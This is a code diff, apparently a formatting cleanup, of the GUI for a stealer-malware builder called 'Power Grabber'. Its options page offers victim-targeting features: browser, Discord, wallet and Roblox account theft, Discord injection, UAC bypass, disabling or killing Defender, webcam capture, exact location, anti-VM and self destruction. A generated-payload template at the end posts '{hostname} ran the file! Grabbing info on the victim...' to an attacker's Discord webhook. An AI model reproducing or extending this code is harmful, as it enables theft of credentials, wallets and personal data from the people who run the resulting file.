@@ -42,8 +42,7 @@ class Power_Grabber(ctk.CTk):
             text_color='#000000', 
             font=('Arial', 16, 'bold'),
             image=self.settings_icon, 
-            compound="left"
-        )
+            compound="left")
         self.options_button.pack(pady=10)
         self.credits_button = ctk.CTkButton(
             self.sidebar, 
@@ -52,8 +51,7 @@ class Power_Grabber(ctk.CTk):
             fg_color='#FF3535', 
             hover_color='#FF3535',
             text_color='#000000',  
-            font=('Arial', 16, 'bold')
-        )
+            font=('Arial', 16, 'bold'))
         self.credits_button.pack(pady=10)
         self.content_frame = ctk.CTkFrame(self.main_frame, fg_color='transparent')
         self.content_frame.pack(padx=20, pady=20, fill=BOTH, expand=True)
@@ -73,8 +71,7 @@ class Power_Grabber(ctk.CTk):
             text_color='#000000',
             font=('Arial', 16, 'bold'),
             image=self.github_icon, 
-            compound="left"
-        )
+            compound="left")
         self.github_button.pack(pady=10)
         discord_response = requests.get(u)
         discord_image_data = discord_response.content
@@ -90,8 +87,7 @@ class Power_Grabber(ctk.CTk):
             text_color='#000000',
             font=('Arial', 16, 'bold'),
             image=self.discord_icon, 
-            compound="left"
-        )
+            compound="left")
         self.discord_button.pack(pady=10)
         self.support_button = ctk.CTkButton(
             self.sidebar, 
@@ -100,8 +96,7 @@ class Power_Grabber(ctk.CTk):
             fg_color='#FF3535', 
             hover_color='#FF3535',
             text_color='#000000',
-            font=('Arial', 16, 'bold')
-        )
+            font=('Arial', 16, 'bold'))
         self.support_button.pack(pady=10)
         self.login_button = ctk.CTkButton(
             self.sidebar,
@@ -109,8 +104,7 @@ class Power_Grabber(ctk.CTk):
             fg_color='#FF3535',
             hover_color='#FF3535',
             text_color='#000000',
-            font=('Arial', 16, 'bold')
-        )
+            font=('Arial', 16, 'bold'))
         self.login_button.pack(pady=10)
         self.free_vbucks_button = ctk.CTkButton(
             self.sidebar, 
@@ -119,8 +113,7 @@ class Power_Grabber(ctk.CTk):
             fg_color='#FF3535', 
             hover_color='#FF3535', 
             text_color='#000000',
-            font=('Arial', 16, 'bold')
-        )
+            font=('Arial', 16, 'bold'))
         self.free_vbucks_button.pack(pady=10)
     def create_options_page(self):
         page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
@@ -141,8 +134,7 @@ class Power_Grabber(ctk.CTk):
             border_width=3,
             corner_radius=15,
             border_color='#FF3535',
-            font=('Arial', 14, 'bold')
-        )
+            font=('Arial', 14, 'bold'))
         webhook_entry.pack(pady=(15, 15))
         webhook_entry.bind("<Enter>", lambda e: on_hover(e, webhook_entry))
         webhook_entry.bind("<Leave>", lambda e: off_hover(e, webhook_entry))
@@ -157,8 +149,7 @@ class Power_Grabber(ctk.CTk):
             border_width=3,
             corner_radius=15,
             border_color='#FF3535',
-            font=('Arial', 14, 'bold')
-        )
+            font=('Arial', 14, 'bold'))
         filename_entry.pack(pady=(15, 25))
         filename_entry.bind("<Enter>", lambda e: on_hover(e, filename_entry))
         filename_entry.bind("<Leave>", lambda e: off_hover(e, filename_entry))
@@ -171,12 +162,7 @@ class Power_Grabber(ctk.CTk):
                         border_color='#FF3535',
                         corner_radius=5)
         hr.pack(pady=(0, 10))
-        checkbox_options = [
-            'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
-            'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Email Addresses', 'Exact location', 
-            'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction', 'Screenshot', 
-            'System info', 'UAC Bypass', 'Vulnerable port creation', 'Wallets', 'Watch Dog', 'Webcam'
-        ]
+        checkbox_options = ['Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents', 'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Email Addresses', 'Exact location', 'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction', 'Screenshot', 'System info', 'UAC Bypass', 'Vulnerable port creation', 'Wallets', 'Watch Dog', 'Webcam']
         checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
         checkbox_frame.pack(fill=X)
         checkbox_dict = {}
@@ -197,8 +183,7 @@ class Power_Grabber(ctk.CTk):
                 border_width=1,
                 font=('Arial', 12, 'bold', 'italic'),
                 text_color_disabled='gray',
-                hover=True
-            )
+                hover=True)
             checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
             checkbox_dict[option] = checkbox
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
@@ -242,8 +227,7 @@ class Power_Grabber(ctk.CTk):
                 "Watch-Dog": bool(checkbox_dict['Watch Dog'].get()),
                 "Webcam": bool(checkbox_dict['Webcam'].get()),
                 "Filepumper-Value": pumper_combo.get(),
-                "Ping": ping_combo.get(),
-            }
+                "Ping": ping_combo.get(),}
             enabled_features = []
             feature_values = {}
             webhook_url = webhook_entry.get()
@@ -342,9 +326,7 @@ data = {{
                 "title": "Power Grabber Notification",
                 "description": f"{{hostname}} ran the file! Grabbing info on the victim...",
                 "color": 0x8B0000
-            }}
-        ]
-    }}
+            }}]}}
 response = requests.post("{webhook_url}", json=data)
 if response.status_code == 204:
     pass
